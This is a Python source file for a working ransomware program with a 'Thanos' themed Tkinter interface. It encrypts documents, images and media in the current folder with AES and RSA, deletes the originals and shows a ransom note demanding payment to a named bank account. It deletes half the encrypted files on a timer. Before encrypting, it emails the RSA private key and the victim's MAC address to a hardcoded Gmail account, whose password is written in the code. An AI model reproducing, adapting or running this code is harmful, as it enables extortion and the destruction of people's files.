from tkinter import messagebox

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP
import os
import threading
from time import sleep

import smtplib
import uuid
import poplib
from email.mime.text import MIMEText

import tkinter
from tkinter.ttk import Label
from PIL import Image, ImageTk

# self.window.protocol("WM_DELETE_WINDOW", self.disable_event(self))
iv = os.urandom(16)


def enc(key, cipher, in_filename, out_filename=None):
    ciphertext = cipher.encrypt(key)  # 128비트
    mode = AES.MODE_CBC

    if not out_filename:
        out_filename = in_filename + '.antdd'

    with open(in_filename, 'rb') as infile:
        data = infile.read()
        size_of_data = len(data)
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length

        with open(out_filename, 'wb') as outfile:
            pass

        with open(out_filename, 'ab') as outfile:  # 이어쓰기 모드
            # RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
            outfile.write(b'0' * (64832 - len(str(size_of_data))) + str(size_of_data).encode())

            # RSA : 암호화된 AES 키를 넣어줌 (128바이트)
            outfile.write(ciphertext)
            encryptor = AES.new(key, mode, iv)
            e_data = encryptor.encrypt(data)
            outfile.write(e_data)


def dec(cipher, in_filename, out_filename=None):
    mode = AES.MODE_CBC

    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        e_data = infile.read()

        # RSA : 파일의 크기와 암호화된 AES 키 추출
        size_of_data = int(e_data[:64832].lstrip(b'0').decode())
        aes_key_enc = e_data[64832:64960]  # 암호화된 aes 키

        # RSA : 암호화된 진짜 원본 데이터 추출
        e_data = e_data[64960:]

        # RSA : 추출한 AES 키 복호화
        aes_key_dec = cipher.decrypt(aes_key_enc)

        with open(out_filename, 'wb') as outfile:
            decryptor = AES.new(aes_key_dec, mode, iv)
            d_data = decryptor.decrypt(e_data)
            d_data = d_data[:size_of_data]
            outfile.write(d_data)


def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
    gui.l_thanos.destroy()
    gui.l_thanos = AnimatedGIF(gui.window, "../ui/thanos1.gif")
    gui.l_thanos.pack()

    sleep(2)

    if (len(remove_filelist) >= 2):
        n = 0
        if (len(remove_filelist) % 2 == 0):
            n = round(len(remove_filelist) / 2)
        else:
            n = round(len(remove_filelist) / 2) - 1
        for i in range(n):
            os.remove(remove_filelist[i])

    elif (len(remove_filelist) == 1):
        os.remove(remove_filelist[0])
        gui.listWindow.destroy()
        gui.allRemovePrint()

    gui.l_thanos.pack_forget()
    gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos, borderwidth=0, compound="center", highlightthickness=0)
    gui.l_thanos.pack()

    gui.listWindow.destroy()

    startTimer(gui, os.getcwd())  # @@


class AnimatedGIF(Label, object):
    def __init__(self, master, path, forever=True):
        self._master = master
        self._loc = 0
        self._forever = forever

        self._is_running = False

        im = Image.open(path)
        self._frames = []
        i = 0
        try:
            while True:
                photoframe = ImageTk.PhotoImage(im.copy().convert('RGBA'))
                self._frames.append(photoframe)

                i += 1
                im.seek(i)
        except EOFError:
            pass

        self._last_index = len(self._frames) - 1

        try:
            self._delay = im.info['duration']
        except:
            self._delay = 100

        self._callback_id = None

        super(AnimatedGIF, self).__init__(master, image=self._frames[0])

    def start_animation(self, frame=None):
        if self._is_running:
            return

        if frame is not None:
            self._loc = 0
            self.configure(image=self._frames[frame])

        self._master.after(self._delay, self._animate_GIF)
        self._is_running = True

    def stop_animation(self):
        if not self._is_running:
            return

        if self._callback_id is not None:
            self.after_cancel(self._callback_id)
            self._callback_id = None

        self._is_running = False

    def _animate_GIF(self):
        self._loc += 1
        self.configure(image=self._frames[self._loc])

        if self._loc == self._last_index:
            if self._forever:
                self._loc = 0
                self._callback_id = self._master.after(self._delay, self._animate_GIF)
            else:
                self._callback_id = None
                self._is_running = False
        else:
            self._callback_id = self._master.after(self._delay, self._animate_GIF)

    def pack(self, start_animation=True, **kwargs):
        if start_animation:
            self.start_animation()
        super(AnimatedGIF, self).pack(**kwargs)

    def grid(self, start_animation=True, **kwargs):
        if start_animation:
            self.start_animation()
        super(AnimatedGIF, self).grid(**kwargs)

    def place(self, start_animation=True, **kwargs):
        if start_animation:
            self.start_animation()

        super(AnimatedGIF, self).place(**kwargs)

    def pack_forget(self, **kwargs):
        self.stop_animation()
        super(AnimatedGIF, self).pack_forget(**kwargs)

    def grid_forget(self, **kwargs):
        self.stop_animation()
        super(AnimatedGIF, self).grid_forget(**kwargs)

    def place_forget(self, **kwargs):
        self.stop_animation()
        super(AnimatedGIF, self).place_forget(**kwargs)


class MyTk:
    def __init__(self, parent=None):
        self.parent = parent
        self.pw = ""
        self.window = tkinter.Tk()
        self.window.title("ransomware")
        self.window.state('zoomed')  # maximize the window
        self.window.configure(background="black")

        self.l_text = tkinter.Label(self.window,
                                    text="\nYOUR FILES HAVE BEEN ENCRYPTED."
                                         "\nYour photos, documents, etc..."
                                         "\nBut, don't worry! I have not deleted them yet :D"
                                         "\nYou have some time to pay 10,000,000KRW in our account to get the decryption key."
                                         "\nOUR ACCOUNT : KB 786102-00-040854"
                                         "\nIf you send money, send an e-mail with your account at this address."
                                         "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
                                         "\nEvery hour half of all files will be deleted."
                                         "\n--WARNING--"
                                         "\nDo not force-terminate this program."
                                         "\nYou will NEVER decrypt your files."
                                         "\n",
                                    fg="green", bg="black", font='Helvetica 14 bold')
        self.l_text.pack()

        self.l_timer = tkinter.Label(self.window, text="Start the timer!", fg="red", bg="black",
                                     font='Helvetica 24 bold')
        self.l_timer.pack()

        self.l_input = tkinter.Label(self.window,
                                     text="\nPassword:",
                                     fg="green", bg="black", font='Helvetica 14 bold')
        self.l_input.pack()

        self.password = tkinter.Entry(self.window)
        self.password.pack()

        self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit, disabledforeground='green')
        self.pwbutton.pack()

        self.thanos = tkinter.PhotoImage(file="../ui/face.png")
        self.l_thanos = tkinter.Label(self.window, image=self.thanos, borderwidth=0, compound="center",
                                      highlightthickness=0)
        self.l_thanos.pack()

    def disable_event(self):
        messagebox.showinfo(title="Thanos Ransomware", message="You can't leave this window.")
        pass

    def keySubmit(self):
        self.pw = str(self.password.get())

        self.l_input.config(text=" The keys are being checked ... ")
        self.pwbutton.config(state='disabled')

        self.parent and self.parent.checkPassword(self.pw)

        self.pwbutton.config(state='normal')
        self.l_input.config(text=" It's the wrong key.")

    def imageChange(self):
        self.l_thanos.destroy()
        self.l_thanos = AnimatedGIF(self.window, "../ui/thanos1.gif")
        self.l_thanos.pack()
        sleep(2)
        self.l_thanos.destroy()
        self.l_thanos = tkinter.Label(self.window, image=self.thanos)
        self.l_thanos.pack()

    def finalGui(self):
        self.l_timer.destroy()
        self.l_input.destroy()
        self.password.destroy()
        self.pwbutton.destroy()
        self.l_thanos.destroy()

        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", fg="red",
                           font='Helvetica 24 bold')

        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
        self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
        self.l_final.pack()

        sleep(5)
        self.window.destroy()

    def allRemovePrint(self):
        self.l_timer.destroy()
        self.l_input.destroy()
        self.password.destroy()
        self.pwbutton.destroy()
        self.l_thanos.destroy()

        self.l_text.config(text="\n\n\n\nYour files are all deleted.\n\n", fg="red",
                           font='Helvetica 50 bold')

        sleep(5)
        self.window.destroy()


def startTimer(gui, path, ext=None):
    sleep(1)

    antdd_filelist = []
    n = 0

    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)):
            if name.endswith('antdd'):
                antdd_filelist.append(name)
                n += 1
            else:
                continue

    if len(antdd_filelist) == 0:
        gui.allRemovePrint()
        return

    gui.listWindow = tkinter.Toplevel(gui.window)
    gui.listWindow.title('Encrypt File You Have')
    gui.listWindow.geometry("800x400")
    gui.listWindow.configure(background="black")
    gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['[' + x + ']' for x in antdd_filelist]),
                             background="black", fg="green",
                             font='Helvetica 14 bold')
    gui.listWindow.lift()
    gui.list.pack()

    clock(gui, 10, antdd_filelist)


def clock(gui, sec, antdd_filelist):
    sec -= 1

    # 0초가 되면!
    if sec == -2:
        # 파일 삭제를 시작함
        removeFiles(gui, antdd_filelist)
        return

    # 분초로 타이머 나타내기
    gui_min = (sec + 1) // 60
    gui_sec = (sec + 1) % 60
    min_sec = str(gui_min) + " : " + str(gui_sec)

    # gui의 타이머 label 을 갱신!
    gui.l_timer.config(text=min_sec)

    # 자기 자신 호출
    threading.Timer(1, clock, [gui, sec, antdd_filelist]).start()


class RealMain:

    def __init__(self):
        self.key = os.urandom(16)

        self.UUID = uuid.getnode()  # Mac 주소

        # RSA : 키, 싸이퍼 생성
        self.random_generator = Random.new().read
        self.rsa_key = RSA.generate(1024, self.random_generator)  # 키 정보 객체
        self.public_key = self.rsa_key.publickey().export_key()  # 공개키
        self.private_key = self.rsa_key.export_key()  # 비밀키

        self.myGui = MyTk(parent=self)  # 자기자신에 대한 레퍼런스를 가지는 gui 객체 생성

    def encListFiles(self, path):
        filelist = []
        extlist = \
            ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
             'jpg', 'jpeg', 'png', 'gif',
             'mp3', 'wav', 'wma',
             'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
        for name in os.listdir(path):
            if os.path.isfile(os.path.join(path, name)):
                for i in extlist:
                    if name.endswith(i):
                        filelist.append(name)
                    else:
                        continue

        return filelist

    def decListFiles(self, path):
        filelist = []
        for name in os.listdir(path):
            if name.endswith(".antdd"):
                filelist.append(name)
            else:
                continue
        return filelist

    def run(self):
        # smtp 로그인 후 비밀키 전송
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.ehlo()  # say Hello
        smtp.starttls()  # TLS 사용시 필요
        smtp.login('secureantdd@gmail.com', 'antdd1234')  # 확인은 이 계정에서!

        msg = MIMEText(self.private_key.decode())  # RSA개인키 를 메세지로 전송함
        msg['Subject'] = str(self.UUID)  # 사용자의 Mac 주소를 제목으로 전송
        msg['To'] = 'secureantdd@gmail.com'
        smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())

        smtp.quit()

        enc_targetlist = self.encListFiles(os.getcwd())  # @@

        for enc_target in enc_targetlist:
            if enc_target.split('.')[-1] == 'antdd':
                continue
            enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target,
                out_filename=None)
            os.remove(enc_target)

        th1 = threading.Thread(target=startTimer, args=[self.myGui, os.getcwd()])  # @@
        th1.daemon = True
        th1.start()

        self.myGui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
        self.myGui.window.mainloop()

    def checkPassword(self, gui_input=None):
        # 서버와 연동/ 로그인
        SERVER = "pop.gmail.com"
        server = poplib.POP3_SSL(SERVER)
        server.user('secureantdd@gmail.com')
        server.pass_('antdd1234')

        # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석
        for i in range(len(server.list()[1])):
            msg = server.retr(i + 1)[1]
            text = b'\n'.join(msg).decode()  # 메일의 전체 내용을 읽어옴
            idx = text.find('Subject:')
            text = text[idx + 9:]
            uuid = text[: text.find('\n')]  # 메일의 수신자(mac 주소) 를 가져온다
            key = text[42:]  # 메일에 들어있는 해당 주소의 private key

            # 만약 같은 주소의 사용자에게 온 메일이 있다면
            if uuid == str(self.UUID):

                # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                if key.strip() == gui_input.strip():
                    # 해당 메일 삭제
                    server.dele(i + 1)
                    server.quit()

                    ##! 복호화 및 타겟파일 삭제
                    dec_targetlist = self.decListFiles(os.getcwd())  # @@
                    for dec_target in dec_targetlist:
                        dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                        os.remove(dec_target)
                    self.myGui.finalGui()


if __name__ == "__main__":
    r = RealMain()
    r.run()
